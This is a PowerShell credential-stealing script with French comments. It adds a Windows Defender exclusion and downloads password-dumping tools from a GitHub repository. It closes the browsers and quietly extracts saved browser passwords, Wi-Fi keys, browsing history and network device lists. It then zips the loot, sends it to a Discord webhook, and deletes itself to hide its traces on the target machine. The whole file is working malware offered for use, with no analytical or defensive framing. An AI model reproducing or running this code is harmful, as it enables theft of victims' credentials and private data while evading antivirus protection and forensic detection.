[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$WebhookUrl
)

Write-Host "[*] Script demarre avec succes..." -ForegroundColor Green

$basePath = "C:\Users\Public\Documents\scripts"
$dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
$dumpFile = "$dumpFolder.zip"

Write-Host "[*] Ajout exclusion Defender..." -ForegroundColor Yellow
Add-MpPreference -ExclusionPath $basePath -Force -ErrorAction SilentlyContinue

New-Item -ItemType Directory -Path $basePath -Force | Out-Null
New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null

# Téléchargement des outils depuis le dépôt GitHub
Write-Host "[*] Telechargement des outils..." -ForegroundColor Yellow
try {
    Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/WirelessKeyView.exe" -OutFile "$basePath\WirelessKeyView.exe" -ErrorAction Stop
    Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/chromepass.exe" -OutFile "$basePath\chromepass.exe" -ErrorAction Stop
    Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/BrowsingHistoryView.exe" -OutFile "$basePath\BrowsingHistoryView.exe" -ErrorAction Stop
    Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/WNetWatcher.exe" -OutFile "$basePath\WNetWatcher.exe" -ErrorAction Stop
    Write-Host "[+] Outils telecharges avec succes !" -ForegroundColor Green
} catch {
    Write-Host "[-] Erreur lors du telechargement des outils : $_" -ForegroundColor Red
    exit 1
}

Stop-Process -Name "chrome", "msedge", "firefox", "brave" -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 3

# --- EXTRACTION CHROMEPASS AVEC DOSSIER DE TRAVAIL FORCÉ ---
Write-Host "[*] Lancement de chromepass..." -ForegroundColor Yellow
$explorer = Get-Process -IncludeUserName | Where-Object {$_.ProcessName -eq "explorer"} | Select-Object -First 1

if ($explorer) {
    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processInfo.FileName = "$basePath\chromepass.exe"
    $processInfo.Arguments = "/stext passwords.txt"
    $processInfo.WorkingDirectory = $basePath
    $processInfo.UseShellExecute = $true
    [System.Diagnostics.Process]::Start($processInfo) | Out-Null
    Start-Sleep -Seconds 6
} else {
    Start-Process -FilePath "$basePath\chromepass.exe" -ArgumentList "/stext passwords.txt" -WorkingDirectory $basePath -Wait -WindowStyle Hidden
}

# Exécution des autres outils avec chemins absolus
if (Test-Path "$basePath\WirelessKeyView.exe") {
    Start-Process -FilePath "$basePath\WirelessKeyView.exe" -ArgumentList "/stext $basePath\wifi.txt" -Wait -WindowStyle Hidden
}
if (Test-Path "$basePath\BrowsingHistoryView.exe") {
    Start-Process -FilePath "$basePath\BrowsingHistoryView.exe" -ArgumentList "/VisitTimeFilterType 3 7 /stext $basePath\history.txt" -Wait -WindowStyle Hidden
}
if (Test-Path "$basePath\WNetWatcher.exe") {
    Start-Process -FilePath "$basePath\WNetWatcher.exe" -ArgumentList "/stext $basePath\connected_devices.txt" -Wait -WindowStyle Hidden
}

# Vérification et sécurisation des fichiers générés
foreach ($file in @("passwords.txt", "wifi.txt", "history.txt", "connected_devices.txt")) {
    $filePath = "$basePath\$file"
    if (!(Test-Path $filePath)) {
        Set-Content -Path $filePath -Value "No data captured"
    }
    Move-Item $filePath -Destination "$dumpFolder" -Force
}

Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force

if (!(Test-Path $dumpFile)) { exit 1 }

# Envoi du fichier ZIP sur le webhook Discord
Write-Host "[*] Envoi sur Discord..." -ForegroundColor Yellow
if (-not ("System.Net.Http.HttpClient" -as [type])) {
    $httpPath = Get-ChildItem -Path "C:\Windows\Microsoft.NET\Framework64\" -Recurse -Filter "System.Net.Http.dll" | Select-Object -First 1 -ExpandProperty FullName
    if ($httpPath) { Add-Type -Path $httpPath } else { exit 1 }
}

$client = New-Object System.Net.Http.HttpClient
$content = New-Object System.Net.Http.MultipartFormDataContent
$content.Add((New-Object System.Net.Http.StringContent("Data from $env:USERNAME")), "content")

$fileStream = [System.IO.File]::OpenRead("$dumpFile")
$fileContent = New-Object System.Net.Http.StreamContent($fileStream)
$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
$content.Add($fileContent, "file", [System.IO.Path]::GetFileName("$dumpFile"))

try { 
    $client.PostAsync($WebhookUrl, $content).Wait() 
    Write-Host "[+] Envoi reussi !" -ForegroundColor Green
} catch {
    Write-Host "[-] Erreur lors de l'envoi Discord : $_" -ForegroundColor Red
}

$fileStream.Close()
$fileStream.Dispose()

# Nettoyage des traces sur la machine cible
Remove-Item -Recurse -Force $basePath
Remove-Item "C:\Users\Public\Documents\ps.ps1" -Force
exit
